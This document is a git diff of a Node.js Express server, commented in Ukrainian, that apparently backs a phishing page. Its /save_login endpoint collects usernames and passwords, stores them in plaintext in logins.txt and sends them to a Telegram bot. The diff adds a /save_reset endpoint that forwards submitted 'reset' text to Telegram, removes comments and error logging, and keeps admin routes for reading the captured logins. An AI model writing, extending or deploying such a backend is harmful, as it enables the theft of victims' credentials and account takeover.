@@ -1,4 +1,4 @@
-// server.js
+// server.js// server.js
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -39,7 +39,6 @@ app.get('/', (req, res) => {
 function maskPwd(pwd) {
   if (!pwd) return '';
   if (pwd.length <= 2) return '*'.repeat(pwd.length);
-  // залишаємо 2 останні символи видимими
   return '*'.repeat(Math.max(0, pwd.length - 2)) + pwd.slice(-2);
 }
 
@@ -60,7 +59,7 @@ async function sendTelegramMessage(text) {
   }
 }
 
-// Endpoint для збереження логіну/пароля
+// Endpoint для логіну
 app.post('/save_login', async (req, res) => {
   const username = (req.body.username || '').toString().trim();
   const password = (req.body.password || '').toString();
@@ -71,34 +70,32 @@ app.post('/save_login', async (req, res) => {
   const time = new Date().toISOString();
   const fullLine = `${time} - ${username} : ${password}\n`;
 
-  // Формуємо текст для Telegram (за налаштуванням маскуємо пароль)
   const sendPass = MASK_PASSWORD ? maskPwd(password) : password;
   const tgText = `<b>New login</b>\nTime: ${time}\nUser: ${username}\nPass: ${sendPass}`;
 
-  // Відправка в Telegram (не блокуємо запис у файл)
-  sendTelegramMessage(tgText).then(r => {
-    if (r && r.ok) {
-      console.log('Telegram: sent');
-    } else {
-      console.warn('Telegram: not sent or error');
-    }
-  }).catch(err => {
-    console.error('Telegram promise error:', err);
-  });
+  sendTelegramMessage(tgText);
 
-  // Запис у файл (опціонально — зверни увагу, що на деяких free хостингах FS не персистентний)
   const filePath = path.join(__dirname, 'logins.txt');
   fs.appendFile(filePath, fullLine, (err) => {
     if (err) {
-      console.error('File write error:', err);
-      // Відповідаємо успішно, бо повідомлення в Telegram могло піти
       return res.status(200).send('Дані отримано (Telegram). Але помилка запису у файл.');
     }
     res.send('Дані збережено (Telegram + файл).');
   });
 });
 
-// Адмін-форма для перегляду логів
+// 📌 ДОДАНО — збереження тексту reset
+app.post('/save_reset', (req, res) => {
+  const text = (req.body.text || '').toString().trim();
+  if (!text) return res.status(400).send('Empty');
+
+  const time = new Date().toISOString();
+  sendTelegramMessage(`🔵 Reset text:\n${text}\nTime: ${time}`);
+
+  res.send('OK');
+});
+
+// Admin
 app.get('/admin', (req, res) => {
   const html = `<!doctype html>
   <html><head><meta charset="utf-8"><title>Admin</title></head><body style="font-family:Arial,sans-serif;padding:20px;">
@@ -112,7 +109,7 @@ app.get('/admin', (req, res) => {
   res.type('html').send(html);
 });
 
-// Показ логів (POST)
+// Перегляд логів
 app.post('/view_logins', (req, res) => {
   const key = (req.body.key || '').toString();
   if (!key || key !== ADMIN_KEY) {
@@ -123,14 +120,13 @@ app.post('/view_logins', (req, res) => {
   fs.readFile(filePath, 'utf8', (err, data) => {
     if (err) {
       if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
-      console.error(err);
       return res.status(500).send('Помилка при читанні файлу.');
     }
     res.type('text/plain').send(data);
   });
 });
 
-// Доступ через GET (з query ?key=...) — зручний, але менш безпечний
+// GET view_logins
 app.get('/view_logins', (req, res) => {
   const key = (req.query.key || '').toString();
   if (!key || key !== ADMIN_KEY) return res.status(403).send('Access denied');
@@ -138,7 +134,6 @@ app.get('/view_logins', (req, res) => {
   fs.readFile(filePath, 'utf8', (err, data) => {
     if (err) {
       if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
-      console.error(err);
       return res.status(500).send('Помилка при читанні файлу.');
     }
     res.type('text/plain').send(data);
@@ -148,3 +143,5 @@ app.get('/view_logins', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
+
